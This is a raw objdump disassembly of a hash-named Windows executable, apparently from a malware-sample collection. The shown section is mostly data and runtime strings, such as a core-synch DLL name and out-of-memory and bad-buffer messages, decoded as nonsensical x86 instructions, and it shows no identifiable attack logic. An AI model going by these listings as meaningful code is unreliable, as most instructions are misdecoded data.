
b0eea66f156eec3be63fea4011f72515651ff6007b32f741008f22b0c01d892e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	add    bl,cl
  401006:	inc    eax
	...
  40100f:	add    BYTE PTR [eax],dh
  401011:	retf   0x40
  401014:	or     bh,0x40
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax],dh
  40101d:	retf   0x0
  401020:	add    bl,cl
  401022:	add    BYTE PTR [eax],al
  401024:	add    ch,cl
  401026:	add    BYTE PTR [eax],al
  401028:	adc    ch,cl
  40102a:	add    BYTE PTR [eax],al
  40102c:	xor    bh,cl
  40102e:	add    BYTE PTR [eax],al
  401030:	or     bh,0x0
  401033:	add    BYTE PTR [eax-0x2e],ah
  401036:	add    BYTE PTR [eax],al
  401038:	lock rol BYTE PTR [eax],cl
  40103b:	add    BYTE PTR [eax],ah
  40103d:	rol    DWORD PTR [eax],cl
  40103f:	add    BYTE PTR [eax],al
  401041:	aam    0x0
  401043:	add    BYTE PTR [eax-0x2c],al
	...
  40104e:	add    BYTE PTR [eax],al
  401050:	mov    al,ds:0xf0004118
  401055:	sbb    BYTE PTR [ecx+0x0],al
  401058:	push   eax
  401059:	add    BYTE PTR [edx+0x0],dl
  40105c:	pusha  
  40105d:	adc    BYTE PTR [eax+0x0],al
  401060:	add    BYTE PTR gs:[eax+0x0],bh
  401064:	je     0x401066
  401066:	sub    eax,0x73006d00
  40106b:	add    BYTE PTR ds:0x69007700,ch
  401071:	add    BYTE PTR [esi+0x0],ch
  401074:	sub    eax,0x74006e00
  401079:	add    BYTE PTR [ebp+0x0],dh
  40107c:	jae    0x40107e
  40107e:	add    BYTE PTR gs:[edx+0x0],dh
  401082:	sub    eax,0x68006300
  401087:	add    BYTE PTR [ecx+0x0],ah
  40108a:	jb     0x40108c
  40108c:	je     0x40108e
  40108e:	jb     0x401090
  401090:	popa   
  401091:	add    BYTE PTR [esi+0x0],ch
  401094:	jae    0x401096
  401096:	ins    BYTE PTR es:[edi],dx
  401097:	add    BYTE PTR [ecx+0x0],ah
  40109a:	je     0x40109c
  40109c:	imul   eax,DWORD PTR [eax],0x6e006f
  4010a2:	sub    eax,0x31006c00
  4010a7:	add    BYTE PTR ds:0x2d003100,ch
  4010ad:	add    BYTE PTR [eax],dh
	...
  4010bf:	add    BYTE PTR [ebp+0x78],ah
  4010c2:	je     0x4010f1
  4010c4:	ins    DWORD PTR es:[edi],dx
  4010c5:	jae    0x4010f4
  4010c7:	ja     0x401132
  4010c9:	outs   dx,BYTE PTR ds:[esi]
  4010ca:	sub    eax,0x7375746e
  4010cf:	gs jb  0x4010ff
  4010d2:	arpl   WORD PTR [eax+0x61],bp
  4010d5:	jb     0x40114b
  4010d7:	jb     0x40113a
  4010d9:	outs   dx,BYTE PTR ds:[esi]
  4010da:	jae    0x401148
  4010dc:	popa   
  4010dd:	je     0x401148
  4010df:	outs   dx,DWORD PTR ds:[esi]
  4010e0:	outs   dx,BYTE PTR ds:[esi]
  4010e1:	sub    eax,0x312d316c
  4010e6:	sub    eax,0x6c642e30
  4010eb:	ins    BYTE PTR es:[edi],dx
  4010ec:	add    BYTE PTR [eax],al
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	push   ebp
  4010f1:	outs   dx,BYTE PTR ds:[esi]
  4010f2:	jb     0x401159
  4010f4:	arpl   WORD PTR [edi+0x67],bp
  4010f7:	outs   dx,BYTE PTR ds:[esi]
  4010f8:	imul   edi,DWORD PTR [edx+0x65],0x6f632064
  4010ff:	ins    DWORD PTR es:[edi],dx
  401100:	ins    DWORD PTR es:[edi],dx
  401101:	popa   
  401102:	outs   dx,BYTE PTR ds:[esi]
  401103:	cmp    ah,BYTE PTR fs:[eax]
  401106:	and    eax,0x73
  40110b:	add    BYTE PTR [esi+0x61],ah
  40110e:	je     0x401171
  401110:	ins    BYTE PTR es:[edi],dx
  401111:	and    BYTE PTR [esi+0x6c],ah
  401114:	gs js  0x401137
  401117:	jae    0x40117c
  401119:	popa   
  40111a:	outs   dx,BYTE PTR ds:[esi]
  40111b:	outs   dx,BYTE PTR ds:[esi]
  40111c:	gs jb  0x40113f
  40111f:	imul   ebp,DWORD PTR [esi+0x74],0x616e7265
  401126:	ins    BYTE PTR es:[edi],dx
  401127:	and    BYTE PTR [ebp+0x72],ah
  40112a:	jb     0x40119b
  40112c:	jb     0x40115b
  40112e:	sub    eax,0x61206f6e
  401133:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  401137:	outs   dx,BYTE PTR ds:[esi]
  401138:	and    BYTE PTR [esi+0x6f],ah
  40113b:	jne    0x4011ab
  40113d:	add    BYTE PTR fs:[eax],al
  401140:	popaw  
  401142:	je     0x4011a5
  401144:	ins    BYTE PTR es:[edi],dx
  401145:	and    BYTE PTR [esi+0x6c],ah
  401148:	gs js  0x40116b
  40114b:	jae    0x4011b0
  40114d:	popa   
  40114e:	outs   dx,BYTE PTR ds:[esi]
  40114f:	outs   dx,BYTE PTR ds:[esi]
  401150:	gs jb  0x401173
  401153:	imul   ebp,DWORD PTR [esi+0x74],0x616e7265
  40115a:	ins    BYTE PTR es:[edi],dx
  40115b:	and    BYTE PTR [ebp+0x72],ah
  40115e:	jb     0x4011cf
  401160:	jb     0x40118f
  401162:	sub    eax,0x20646e65
  401167:	outs   dx,DWORD PTR ds:[esi]
  401168:	data16 and BYTE PTR [edx+0x75],ah
  40116c:	data16 data16 gs jb 0x401191
  401171:	ins    DWORD PTR es:[edi],dx
  401172:	imul   esi,DWORD PTR [ebx+0x73],0x69006465
  401179:	outs   dx,BYTE PTR ds:[esi]
  40117a:	je     0x4011e1
  40117c:	addr16 gs jb 0x4011a0
  401180:	outs   dx,DWORD PTR ds:[esi]
  401181:	jbe    0x4011e8
  401183:	jb     0x4011eb
  401185:	ins    BYTE PTR es:[edi],dx
  401186:	outs   dx,DWORD PTR ds:[esi]
  401187:	ja     0x401189
  401189:	add    BYTE PTR [eax],al
  40118b:	add    BYTE PTR [esi+0x61],ah
  40118e:	je     0x4011f1
  401190:	ins    BYTE PTR es:[edi],dx
  401191:	and    BYTE PTR [ebp+0x72],ah
  401194:	jb     0x401205
  401196:	jb     0x4011b8
  401198:	sub    eax,0x61637320
  40119d:	outs   dx,BYTE PTR ds:[esi]
  40119e:	outs   dx,BYTE PTR ds:[esi]
  40119f:	gs jb  0x4011c2
  4011a2:	imul   ebp,DWORD PTR [esi+0x70],0x62207475
  4011a9:	jne    0x401211
  4011ab:	data16 gs jb 0x4011cf
  4011af:	outs   dx,DWORD PTR ds:[esi]
  4011b0:	jbe    0x401217
  4011b2:	jb     0x40121a
  4011b4:	ins    BYTE PTR es:[edi],dx
  4011b5:	outs   dx,DWORD PTR ds:[esi]
  4011b6:	ja     0x4011b8
  4011b8:	imul   ebp,DWORD PTR [esi+0x70],0x69207475
  4011bf:	outs   dx,BYTE PTR ds:[esi]
  4011c0:	and    BYTE PTR [esi+0x6c],ah
  4011c3:	gs js  0x4011e6
  4011c6:	jae    0x40122b
  4011c8:	popa   
  4011c9:	outs   dx,BYTE PTR ds:[esi]
  4011ca:	outs   dx,BYTE PTR ds:[esi]
  4011cb:	gs jb  0x4011ee
  4011ce:	popaw  
  4011d0:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x0
  4011d8:	outs   dx,DWORD PTR ds:[esi]
  4011d9:	jne    0x40124f
  4011db:	and    BYTE PTR [edi+0x66],ch
  4011de:	and    BYTE PTR [ecx+edi*2+0x6e],ah
  4011e2:	popa   
  4011e3:	ins    DWORD PTR es:[edi],dx
  4011e4:	imul   esp,DWORD PTR [ebx+0x20],0x6f6d656d
  4011eb:	jb     0x401266
  4011ed:	and    BYTE PTR [ecx+0x6e],ch
  4011f0:	and    BYTE PTR [ecx+0x79],bh
  4011f3:	pop    edi
  4011f4:	arpl   WORD PTR [edx+0x65],si
  4011f7:	popa   
  4011f8:	je     0x40125f
  4011fa:	pop    edi
  4011fb:	bound  esi,QWORD PTR [ebp+0x66]
  4011fe:	data16 gs jb 0x40122a
  401202:	sub    DWORD PTR [eax],eax
  401204:	and    eax,0xa73
	...
  401215:	add    BYTE PTR [eax],bl
  401217:	add    BYTE PTR [edi],dl
  401219:	add    BYTE PTR [esi],dl
  40121b:	add    BYTE PTR [edi],dl
  40121d:	add    BYTE PTR [edi],dl
  40121f:	add    BYTE PTR [eax+eax*1],dl
  401222:	pop    ss
  401223:	add    BYTE PTR [edi],dl
  401225:	add    BYTE PTR [edi],dl
  401227:	add    BYTE PTR [edi],dl
  401229:	add    BYTE PTR [edi],dl
  40122b:	add    BYTE PTR [edi],dl
  40122d:	add    BYTE PTR [edi],dl
  40122f:	add    BYTE PTR [edi],dl
  401231:	add    BYTE PTR [edi],dl
  401233:	add    BYTE PTR [edi],dl
  401235:	add    BYTE PTR [eax],al
  401237:	add    BYTE PTR ds:0x14000000,dl
	...
  401251:	add    BYTE PTR [eax],al
  401253:	add    BYTE PTR [ecx],dl
  401255:	add    BYTE PTR [eax],al
  401257:	add    BYTE PTR [eax],al
  401259:	add    BYTE PTR [edi],cl
	...
  401283:	add    BYTE PTR [eax],al
  401285:	add    BYTE PTR [ebx],dl
	...
  4012a7:	add    BYTE PTR [eax],al
  4012a9:	add    BYTE PTR [eax],dl
  4012ab:	add    BYTE PTR [eax],al
  4012ad:	add    BYTE PTR [ebx],al
  4012af:	add    BYTE PTR [eax],al
  4012b1:	add    BYTE PTR [eax],al
  4012b3:	add    BYTE PTR [esi],cl
  4012b5:	add    BYTE PTR [eax],al
  4012b7:	add    BYTE PTR [edx],cl
	...
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [eax+eax*1],al
  4012c6:	add    BYTE PTR [eax],al
  4012c8:	add    eax,0x0
	...
  4012e5:	add    BYTE PTR ds:0xd000000,cl
	...
  4012f3:	add    BYTE PTR [edx],dl
  4012f5:	add    BYTE PTR [eax],al
  4012f7:	add    BYTE PTR [edi],al
	...
  401305:	add    BYTE PTR [eax],al
  401307:	add    BYTE PTR [eax],cl
  401309:	add    BYTE PTR [eax],al
  40130b:	add    BYTE PTR [eax],cl
	...
  401315:	add    BYTE PTR [eax],al
  401317:	add    BYTE PTR [edx],cl
  401319:	add    BYTE PTR [eax],al
  40131b:	add    BYTE PTR [eax],al
  40131d:	add    BYTE PTR [eax+eax*1],cl
	...
  401328:	pop    es
	...
  401331:	add    BYTE PTR [eax],al
  401333:	add    BYTE PTR [ecx],cl
	...
  40133d:	add    BYTE PTR [eax],al
  40133f:	add    BYTE PTR [ecx],al
  401341:	add    BYTE PTR [eax],al
  401343:	add    BYTE PTR [eax],al
  401345:	add    BYTE PTR [eax],al
  401347:	add    BYTE PTR [esi],al
	...
  401355:	add    BYTE PTR [eax],al
  401357:	add    BYTE PTR [edx],al
	...
  401365:	add    BYTE PTR [eax],al
  401367:	add    BYTE PTR [esi],al
  401369:	add    BYTE PTR [eax],al
  40136b:	add    BYTE PTR [ecx],cl
  40136d:	add    BYTE PTR [eax],al
  40136f:	add    BYTE PTR [ebx],cl
	...
  401381:	add    BYTE PTR [eax],al
  401383:	add    BYTE PTR [ecx],al
  401385:	add    BYTE PTR [eax],al
  401387:	add    BYTE PTR [ecx],al
  401389:	add    BYTE PTR [eax],al
  40138b:	add    BYTE PTR [ecx],al
  40138d:	add    BYTE PTR [eax],al
  40138f:	add    BYTE PTR [ecx],al
  401391:	add    BYTE PTR [eax],al
  401393:	add    BYTE PTR [ecx],al
  401395:	add    BYTE PTR [eax],al
  401397:	add    BYTE PTR [ecx],al
  401399:	add    BYTE PTR [eax],al
  40139b:	add    BYTE PTR [ecx],al
  40139d:	add    BYTE PTR [eax],al
  40139f:	add    BYTE PTR [ecx],al
  4013a1:	add    BYTE PTR [eax],al
  4013a3:	add    BYTE PTR [ecx],al
  4013a5:	add    BYTE PTR [eax],al
  4013a7:	add    BYTE PTR [ecx],al
  4013a9:	add    BYTE PTR [eax],al
  4013ab:	add    BYTE PTR [ecx],al
  4013ad:	add    BYTE PTR [eax],al
  4013af:	add    BYTE PTR [ecx],al
  4013b1:	add    BYTE PTR [eax],al
  4013b3:	add    BYTE PTR [ecx],al
  4013b5:	add    BYTE PTR [eax],al
  4013b7:	add    BYTE PTR [ecx],al
  4013b9:	add    BYTE PTR [eax],al
  4013bb:	add    BYTE PTR [ecx],al
  4013bd:	add    BYTE PTR [eax],al
  4013bf:	add    BYTE PTR [ecx],al
  4013c1:	add    BYTE PTR [eax],al
  4013c3:	add    BYTE PTR [ecx],al
  4013c5:	add    BYTE PTR [eax],al
  4013c7:	add    BYTE PTR [ecx],al
  4013c9:	add    BYTE PTR [eax],al
  4013cb:	add    BYTE PTR [ecx],al
  4013cd:	add    BYTE PTR [eax],al
  4013cf:	add    BYTE PTR [ecx],al
  4013d1:	add    BYTE PTR [eax],al
  4013d3:	add    BYTE PTR [ecx],al
  4013d5:	add    BYTE PTR [eax],al
  4013d7:	add    BYTE PTR [ecx],al
  4013d9:	add    BYTE PTR [eax],al
  4013db:	add    BYTE PTR [ecx],al
  4013dd:	add    BYTE PTR [eax],al
  4013df:	add    BYTE PTR [ecx],al
  4013e1:	add    BYTE PTR [eax],al
  4013e3:	add    BYTE PTR [ecx],al
  4013e5:	add    BYTE PTR [eax],al
  4013e7:	add    BYTE PTR [ecx],al
  4013e9:	add    BYTE PTR [eax],al
  4013eb:	add    BYTE PTR [ecx],al
  4013ed:	add    BYTE PTR [eax],al
  4013ef:	add    BYTE PTR [ecx],al
  4013f1:	add    BYTE PTR [eax],al
  4013f3:	add    BYTE PTR [ecx],al
	...
  401401:	add    BYTE PTR [esi],al
  401403:	add    BYTE PTR [edi],al
  401405:	add    BYTE PTR [eax],cl
  401407:	add    BYTE PTR [esi],al
  401409:	add    BYTE PTR [ecx],cl
  40140b:	add    BYTE PTR [esi],al
  40140d:	add    BYTE PTR [esi],al
  40140f:	add    BYTE PTR [edx],cl
  401411:	add    BYTE PTR [ecx],cl
  401413:	add    BYTE PTR [ecx],cl
  401415:	add    BYTE PTR [ecx],cl
  401417:	add    BYTE PTR [ebx],cl
  401419:	add    BYTE PTR [eax+eax*1],cl
  40141c:	or     DWORD PTR [eax],eax
  40141e:	or     eax,0xe000900
  401423:	add    BYTE PTR [ecx],cl
  401425:	add    BYTE PTR [ecx],cl
  401427:	add    BYTE PTR [ecx],cl
  401429:	add    BYTE PTR [ecx],cl
  40142b:	add    BYTE PTR [edi],cl
  40142d:	add    BYTE PTR [eax],dl
  40142f:	add    BYTE PTR [ecx],dl
  401431:	add    BYTE PTR [ecx],cl
  401433:	add    BYTE PTR [ecx],cl
  401435:	add    BYTE PTR [edx],dl
  401437:	add    BYTE PTR [ecx],cl
  401439:	add    BYTE PTR [ecx],cl
  40143b:	add    BYTE PTR [ebx],dl
  40143d:	add    BYTE PTR ds:0x13001600,dl
  401443:	add    BYTE PTR [edi],dl
  401445:	add    BYTE PTR [ebx],dl
  401447:	add    BYTE PTR [ebx],dl
  401449:	add    BYTE PTR [eax],bl
  40144b:	add    BYTE PTR [edi],dl
  40144d:	add    BYTE PTR [edi],dl
  40144f:	add    BYTE PTR [edi],dl
  401451:	add    BYTE PTR [ecx],bl
  401453:	add    BYTE PTR [edx],bl
  401455:	add    BYTE PTR [edi],dl
  401457:	add    BYTE PTR [ebx],bl
  401459:	add    BYTE PTR [edi],dl
  40145b:	add    BYTE PTR [eax+eax*1],bl
  40145e:	pop    ss
  40145f:	add    BYTE PTR [edi],dl
  401461:	add    BYTE PTR [edi],dl
  401463:	add    BYTE PTR [edi],dl
  401465:	add    BYTE PTR ds:0x1f001e00,bl
  40146b:	add    BYTE PTR [edi],dl
  40146d:	add    BYTE PTR [edi],dl
  40146f:	add    BYTE PTR [eax],ah
  401471:	add    BYTE PTR [edi],dl
  401473:	add    BYTE PTR [edi],dl
  401475:	add    BYTE PTR [ebx],dl
  401477:	add    BYTE PTR [ecx],ah
  401479:	add    BYTE PTR [edx],ah
  40147b:	add    BYTE PTR [eax+eax*1],ah
  40147e:	and    eax,0x13002700
  401483:	add    BYTE PTR [ebx],dl
  401485:	add    BYTE PTR [ebx],dl
  401487:	add    BYTE PTR [ebx],dl
  401489:	add    BYTE PTR [ecx],ah
  40148b:	add    BYTE PTR [edx],ah
  40148d:	add    BYTE PTR [eax],ch
  40148f:	add    BYTE PTR [ebx],ch
  401491:	add    BYTE PTR [ecx],ch
  401493:	add    BYTE PTR [ebx],dl
  401495:	add    BYTE PTR [ebx],dl
  401497:	add    BYTE PTR [ebx],dl
  401499:	add    BYTE PTR [ebx],ah
  40149b:	add    BYTE PTR [ebx],ah
  40149d:	add    BYTE PTR [edx],ch
  40149f:	add    BYTE PTR [eax+eax*1],ch
  4014a2:	and    eax,DWORD PTR [eax]
  4014a4:	and    eax,DWORD PTR [eax]
  4014a6:	and    al,0x0
  4014a8:	and    eax,0x27002d00
  4014ad:	add    BYTE PTR [eax],ch
  4014af:	add    BYTE PTR [ebx],ah
  4014b1:	add    BYTE PTR [ecx],ch
  4014b3:	add    BYTE PTR [edx],ch
  4014b5:	add    BYTE PTR [ebx],ch
  4014b7:	add    BYTE PTR [eax+eax*1],ch
  4014ba:	and    eax,DWORD PTR [eax]
  4014bc:	and    eax,DWORD PTR [eax]
  4014be:	sub    eax,0x23002600
  4014c3:	add    BYTE PTR [ebx],ah
  4014c5:	add    BYTE PTR [ebx],ah
  4014c7:	add    BYTE PTR [ebx],ah
  4014c9:	add    BYTE PTR [eax+eax*1],ah
  4014cc:	and    eax,0x23004000
  4014d1:	add    BYTE PTR [edx+0x23003000],ch
  4014d7:	add    BYTE PTR [ebx],ah
  4014d9:	add    BYTE PTR [ebx],ah
  4014db:	add    BYTE PTR [ebx],dl
  4014dd:	add    BYTE PTR [ecx],ah
  4014df:	add    BYTE PTR [edx],ah
  4014e1:	add    BYTE PTR [ebx],dl
  4014e3:	add    BYTE PTR [ecx],dh
  4014e5:	add    BYTE PTR [ebx],dl
  4014e7:	add    BYTE PTR [edi],ch
  4014e9:	add    BYTE PTR [ebx],dl
  4014eb:	add    BYTE PTR [ebx],dl
  4014ed:	add    BYTE PTR [ebx],ah
  4014ef:	add    BYTE PTR [edx],dh
  4014f1:	add    BYTE PTR [ebx],dh
  4014f3:	add    BYTE PTR ds:0x23003900,dh
  4014f9:	add    BYTE PTR [esi],dh
  4014fb:	add    BYTE PTR [ecx+0x0],al
  4014fe:	aaa    
  4014ff:	add    BYTE PTR [edx+0x0],al
  401502:	cmp    BYTE PTR [eax],al
  401504:	push   eax
  401505:	add    BYTE PTR [eax+eax*1],dh
  401508:	and    eax,DWORD PTR [eax]
  40150a:	and    eax,DWORD PTR [eax]
  40150c:	and    eax,DWORD PTR [eax]
  40150e:	and    eax,DWORD PTR [eax]
  401510:	and    eax,DWORD PTR [eax]
  401512:	inc    ebp
  401513:	add    BYTE PTR [esi+0x0],al
  401516:	add    BYTE PTR fs:[ebx],ah
  401519:	add    BYTE PTR [ebx],ah
  40151b:	add    BYTE PTR [ebx],ah
  40151d:	add    BYTE PTR [ebx],ah
  40151f:	add    BYTE PTR [eax+0x0],cl
  401522:	and    eax,DWORD PTR [eax]
  401524:	and    eax,DWORD PTR [eax]
  401526:	and    eax,DWORD PTR [eax]
  401528:	and    eax,DWORD PTR [eax]
  40152a:	adc    eax,DWORD PTR [eax]
  40152c:	cmp    al,BYTE PTR [eax]
  40152e:	cmp    eax,DWORD PTR [eax]
  401530:	dec    ecx
  401531:	add    BYTE PTR [edx+0x0],cl
  401534:	and    eax,DWORD PTR [eax]
  401536:	adc    eax,DWORD PTR [eax]
  401538:	adc    eax,DWORD PTR [eax]
  40153a:	adc    eax,DWORD PTR [eax]
  40153c:	adc    eax,DWORD PTR [eax]
  40153e:	cmp    eax,0x4c001400
  401543:	add    BYTE PTR [ebp+0x0],cl
  401546:	test   eax,0x13003f00
  40154b:	add    BYTE PTR [ebx],dl
  40154d:	add    BYTE PTR [ebx],dl
  40154f:	add    BYTE PTR [ebx],dh
  401551:	add    BYTE PTR [edx],ah
  401553:	add    BYTE PTR [ebx],dl
  401555:	add    BYTE PTR [ebp+0x0],bl
  401558:	inc    esp
  401559:	add    BYTE PTR [edi],ch
  40155b:	add    BYTE PTR [ebx],dl
  40155d:	add    BYTE PTR [ebx],dl
  40155f:	add    BYTE PTR [edi+0x0],al
  401562:	cmp    al,BYTE PTR [eax]
  401564:	cmp    eax,DWORD PTR [eax]
  401566:	and    eax,DWORD PTR [eax]
  401568:	and    eax,DWORD PTR [eax]
  40156a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40156b:	add    BYTE PTR [ebx+0x0],cl
  40156e:	adc    eax,DWORD PTR [eax]
  401570:	cmp    al,BYTE PTR [eax]
  401572:	cmp    eax,DWORD PTR [eax]
  401574:	dec    esi
  401575:	add    BYTE PTR [edi+0x0],cl
  401578:	and    eax,DWORD PTR [eax]
  40157a:	adc    eax,DWORD PTR [eax]
  40157c:	adc    eax,DWORD PTR [eax]
  40157e:	adc    eax,DWORD PTR [eax]
  401580:	adc    eax,DWORD PTR [eax]
  401582:	cmp    eax,0x51001400
  401587:	add    BYTE PTR [edx+0x0],dl
  40158a:	jne    0x40158c
  40158c:	adc    eax,DWORD PTR [eax]
  40158e:	adc    eax,DWORD PTR [eax]
  401590:	adc    eax,DWORD PTR [eax]
  401592:	pop    eax
  401593:	add    BYTE PTR [esi+0x0],dh
  401596:	and    eax,DWORD PTR [eax]
  401598:	dec    esp
  401599:	add    BYTE PTR [ebp+0x0],cl
  40159c:	pop    ecx
  40159d:	add    BYTE PTR [edx+0x0],bl
  4015a0:	pop    ebx
  4015a1:	add    BYTE PTR [eax+eax*1+0x60],bl
  4015a5:	add    BYTE PTR [ecx+0x0],dl
  4015a8:	push   edx
  4015a9:	add    BYTE PTR [ebx],ah
  4015ab:	add    BYTE PTR [ebx+0x0],dl
  4015ae:	push   esp
  4015af:	add    BYTE PTR [esi+0x0],ah
  4015b2:	adc    al,0x0
  4015b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015b5:	add    BYTE PTR [ebp+0x0],ah
  4015b8:	add    BYTE PTR [si],dl
  4015bb:	add    BYTE PTR [ebx],ah
  4015bd:	add    BYTE PTR [ebx],dl
  4015bf:	add    BYTE PTR [ebx+0x0],dl
  4015c2:	push   esp
  4015c3:	add    BYTE PTR [eax+0x0],ch
  4015c6:	pop    ecx
  4015c7:	add    BYTE PTR [edx+0x0],bl
  4015ca:	adc    eax,DWORD PTR [eax]
  4015cc:	adc    eax,DWORD PTR [eax]
  4015ce:	adc    eax,DWORD PTR [eax]
  4015d0:	adc    al,0x0
  4015d2:	and    eax,DWORD PTR [eax]
  4015d4:	mov    al,ds:0x99002300
  4015d9:	add    BYTE PTR [ebx],ah
  4015db:	add    BYTE PTR [esi+0x56005600],dl
  4015e1:	add    BYTE PTR [ebx+0x0],bl
  4015e4:	pop    esp
  4015e5:	add    BYTE PTR [ebx],ah
  4015e7:	add    BYTE PTR [esi+0x0],dl
  4015ea:	imul   eax,DWORD PTR [eax],0x560079
  4015f0:	jno    0x4015f2
  4015f2:	jb     0x4015f4
  4015f4:	jp     0x4015f6
  4015f6:	and    eax,DWORD PTR [eax]
  4015f8:	and    eax,DWORD PTR [eax]
  4015fa:	push   esi
  4015fb:	add    BYTE PTR [edi+0x0],dl
  4015fe:	adc    eax,DWORD PTR [eax]
  401600:	dec    ecx
  401601:	add    BYTE PTR [edx],ah
  401603:	add    BYTE PTR [esi+0x0],bl
  401606:	xchg   esp,eax
  401607:	add    BYTE PTR [esi+0x0],bl
  40160a:	das    
  40160b:	add    BYTE PTR [ebx],dl
  40160d:	add    BYTE PTR [ebx],dl
  40160f:	add    BYTE PTR [ebx],dl
  401611:	add    BYTE PTR [ecx+0x0],ah
  401614:	adc    al,0x0
  401616:	jae    0x401618
  401618:	je     0x40161a
  40161a:	pop    DWORD PTR [eax]
  40161c:	arpl   WORD PTR [eax],ax
  40161e:	adc    eax,DWORD PTR [eax]
  401620:	adc    eax,DWORD PTR [eax]
  401622:	adc    eax,DWORD PTR [eax]
  401624:	dec    esi
  401625:	add    BYTE PTR [edi+0x0],cl
  401628:	adc    eax,DWORD PTR [eax]
  40162a:	and    eax,DWORD PTR [eax]
  40162c:	adc    eax,DWORD PTR [eax]
  40162e:	das    
  40162f:	add    BYTE PTR [ebx],dl
  401631:	add    BYTE PTR [ebx],dl
  401633:	add    BYTE PTR [ebx],dl
  401635:	add    BYTE PTR [ebx+0x0],dl
  401638:	push   esp
  401639:	add    BYTE PTR [edx+0x0],ch
  40163c:	imul   eax,DWORD PTR [eax],0xffffff8d
  40163f:	add    BYTE PTR [ebx],dl
  401641:	add    BYTE PTR [ebx],dl
  401643:	add    BYTE PTR [ebx],dl
  401645:	add    BYTE PTR [ebx],dl
  401647:	add    BYTE PTR [edx+0x0],ch
  40164a:	imul   eax,DWORD PTR [eax],0x23
  40164d:	add    BYTE PTR [ecx+0x0],dh
  401650:	jb     0x401652
  401652:	adc    eax,DWORD PTR [eax]
  401654:	adc    eax,DWORD PTR [eax]
  401656:	adc    eax,DWORD PTR [eax]
  401658:	adc    eax,DWORD PTR [eax]
  40165a:	ins    BYTE PTR es:[edi],dx
  40165b:	add    BYTE PTR [ebp+0x0],ch
  40165e:	mov    al,BYTE PTR [eax]
  401660:	mov    DWORD PTR [eax],eax
  401662:	mov    BYTE PTR [eax],al
  401664:	adc    eax,DWORD PTR [eax]
  401666:	adc    eax,DWORD PTR [eax]
  401668:	adc    eax,DWORD PTR [eax]
  40166a:	adc    eax,DWORD PTR [eax]
  40166c:	pusha  
  40166d:	add    BYTE PTR [edx],ah
  40166f:	add    BYTE PTR [edi+0x0],ch
  401672:	test   DWORD PTR [eax],eax
  401674:	outs   dx,DWORD PTR ds:[esi]
  401675:	add    BYTE PTR [edi],ch
  401677:	add    BYTE PTR [ebx],dl
  401679:	add    BYTE PTR [ebx],dl
  40167b:	add    BYTE PTR [ebx],dl
  40167d:	add    BYTE PTR [ecx+0x0],ah
  401680:	adc    al,0x0
  401682:	jnp    0x401684
  401684:	jl     0x401686
  401686:	add    BYTE PTR [eax],0x13
  401689:	add    BYTE PTR [ebx],dl
  40168b:	add    BYTE PTR [ebx],dl
  40168d:	add    BYTE PTR [ebx],dl
  40168f:	add    BYTE PTR [esi+0x0],ah
  401692:	adc    al,0x0
  401694:	adc    eax,DWORD PTR [eax]
  401696:	and    eax,DWORD PTR [eax]
  401698:	adc    eax,DWORD PTR [eax]
  40169a:	adc    eax,DWORD PTR [eax]
  40169c:	adc    eax,DWORD PTR [eax]
  40169e:	adc    eax,DWORD PTR [eax]
  4016a0:	adc    eax,DWORD PTR [eax]
  4016a2:	add    BYTE PTR [si],dl
  4016a5:	add    BYTE PTR [ebx],dl
  4016a7:	add    BYTE PTR [eax+0x13001300],al
  4016ad:	add    BYTE PTR [ebx],dl
  4016af:	add    BYTE PTR [ebx],dl
  4016b1:	add    BYTE PTR [eax+eax*1+0x6d],ch
  4016b5:	add    BYTE PTR [ebx+0x7f009c00],bl
  4016bb:	add    BYTE PTR [ebx+0x0],cl
  4016be:	adc    eax,DWORD PTR [eax]
  4016c0:	ins    BYTE PTR es:[edi],dx
  4016c1:	add    BYTE PTR [ebp+0x0],ch
  4016c4:	xchg   ecx,eax
  4016c5:	add    BYTE PTR [edx+0x13006f00],dl
  4016cb:	add    BYTE PTR [ebx],dl
  4016cd:	add    BYTE PTR [ebx],dl
  4016cf:	add    BYTE PTR [ebx],dl
  4016d1:	add    BYTE PTR [ebx+0x0],bh
  4016d4:	jl     0x4016d6
  4016d6:	fwait
  4016d7:	add    BYTE PTR [eax+eax*1+0x130078],bl
  4016de:	adc    eax,DWORD PTR [eax]
  4016e0:	adc    eax,DWORD PTR [eax]
  4016e2:	adc    eax,DWORD PTR [eax]
  4016e4:	jge    0x4016e6
  4016e6:	jle    0x4016e8
  4016e8:	popf   
  4016e9:	add    BYTE PTR [eax+eax*1],dl
  4016ec:	ja     0x4016ee
  4016ee:	adc    eax,DWORD PTR [eax]
  4016f0:	adc    eax,DWORD PTR [eax]
  4016f2:	adc    eax,DWORD PTR [eax]
  4016f4:	adc    eax,DWORD PTR [eax]
  4016f6:	jae    0x4016f8
  4016f8:	je     0x4016fa
  4016fa:	adc    eax,DWORD PTR [eax]
  4016fc:	jo     0x4016fe
  4016fe:	adc    eax,DWORD PTR [eax]
  401700:	add    DWORD PTR [eax],0x130013
  401706:	adc    eax,DWORD PTR [eax]
  401708:	jne    0x40170a
  40170a:	adc    al,0x0
  40170c:	mov    eax,ds:0x6e001400
  401711:	add    BYTE PTR [ebx],dl
  401713:	add    BYTE PTR [ebx],dl
  401715:	add    BYTE PTR [ebx],dl
  401717:	add    BYTE PTR [ebx],dl
  401719:	add    BYTE PTR [ebx-0x54ff7c00],al
  40171f:	add    BYTE PTR [eax+eax*1+0x13005e],ch
  401726:	adc    eax,DWORD PTR [eax]
  401728:	adc    eax,DWORD PTR [eax]
  40172a:	adc    eax,DWORD PTR [eax]
  40172c:	xchg   BYTE PTR [eax],al
  40172e:	xchg   DWORD PTR [eax],eax
  401730:	stos   DWORD PTR es:[edi],eax
  401731:	add    BYTE PTR [eax+eax*1+0x130062],ch
  401738:	adc    eax,DWORD PTR [eax]
  40173a:	adc    eax,DWORD PTR [eax]
  40173c:	adc    eax,DWORD PTR [eax]
  40173e:	jp     0x401740
  401740:	and    al,BYTE PTR [eax]
  401742:	adc    eax,DWORD PTR [eax]
  401744:	pop    edi
